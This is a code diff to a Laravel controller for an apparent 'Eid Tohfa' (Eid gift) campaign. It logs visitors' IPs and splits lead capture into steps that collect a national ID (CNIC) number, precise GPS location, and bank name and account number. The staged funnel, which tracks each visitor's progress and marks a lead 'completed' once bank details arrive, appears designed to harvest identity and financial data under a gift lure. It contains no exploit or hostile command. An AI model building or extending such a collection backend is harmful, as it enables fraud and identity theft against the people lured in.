@@ -217,18 +217,48 @@ class EidTohfaController extends Controller
         ]);
     }
 
+    public function trackFirstVisit(Request $request)
+    {
+        $lead = EidTohfaLead::create([
+            'first_visit_ip' => $request->ip(),
+            'first_visit_at' => now(),
+            'user_agent' => substr((string) $request->userAgent(), 0, 1000),
+            'status' => 'visited',
+        ]);
+
+        return response()->json([
+            'success' => true,
+            'lead_id' => $lead->id,
+        ]);
+    }
+
     public function storeFrontendLead(Request $request)
     {
-        $validator = Validator::make($request->all(), [
+        $step = $request->input('step', 'cnic');
+        
+        $rules = [
             'lead_id' => 'nullable|integer|exists:eid_tohfa_leads,id',
-            'cnic' => 'required|digits:13',
-            'latitude' => 'required|numeric|between:-90,90',
-            'longitude' => 'required|numeric|between:-180,180',
-            'accuracy' => 'nullable|numeric|min:0',
-            'location_captured_at' => 'nullable|date',
-            'bank_name' => 'nullable|string|max:100',
-            'account_number' => 'nullable|string|max:100',
-        ]);
+            'step' => 'required|in:cnic,location,bank',
+            'cnic' => 'nullable|digits:13',
+        ];
+        
+        if ($step === 'cnic') {
+            $rules['cnic'] = 'required|digits:13';
+        }
+        
+        if ($step === 'location') {
+            $rules['latitude'] = 'required|numeric|between:-90,90';
+            $rules['longitude'] = 'required|numeric|between:-180,180';
+            $rules['accuracy'] = 'nullable|numeric|min:0';
+            $rules['location_captured_at'] = 'nullable|date';
+        }
+        
+        if ($step === 'bank') {
+            $rules['bank_name'] = 'nullable|string|max:100';
+            $rules['account_number'] = 'nullable|string|max:100';
+        }
+
+        $validator = Validator::make($request->all(), $rules);
 
         if ($validator->fails()) {
             return response()->json([
@@ -237,19 +267,32 @@ class EidTohfaController extends Controller
             ], 422);
         }
 
+        $statusMap = [
+            'cnic' => 'cnic_submitted',
+            'location' => 'location_captured',
+            'bank' => 'completed',
+        ];
+
         $payload = [
             'cnic' => $request->cnic,
-            'latitude' => $request->latitude,
-            'longitude' => $request->longitude,
-            'accuracy' => $request->accuracy,
-            'location_captured_at' => $request->filled('location_captured_at')
-                ? \Carbon\Carbon::parse($request->location_captured_at)
-                : now(),
-            'bank_name' => $request->bank_name,
-            'account_number' => $request->account_number,
             'ip_address' => $request->ip(),
             'user_agent' => substr((string) $request->userAgent(), 0, 1000),
+            'status' => $statusMap[$step],
         ];
+
+        if ($step === 'location' || $request->filled('latitude')) {
+            $payload['latitude'] = $request->latitude;
+            $payload['longitude'] = $request->longitude;
+            $payload['accuracy'] = $request->accuracy;
+            $payload['location_captured_at'] = $request->filled('location_captured_at')
+                ? \Carbon\Carbon::parse($request->location_captured_at)
+                : now();
+        }
+
+        if ($step === 'bank' || $request->filled('bank_name')) {
+            $payload['bank_name'] = $request->bank_name;
+            $payload['account_number'] = $request->account_number;
+        }
 
         if ($request->filled('lead_id')) {
             $lead = EidTohfaLead::findOrFail($request->lead_id);
@@ -261,6 +304,7 @@ class EidTohfaController extends Controller
         return response()->json([
             'success' => true,
             'lead_id' => $lead->id,
+            'status' => $lead->status,
         ]);
     }
 
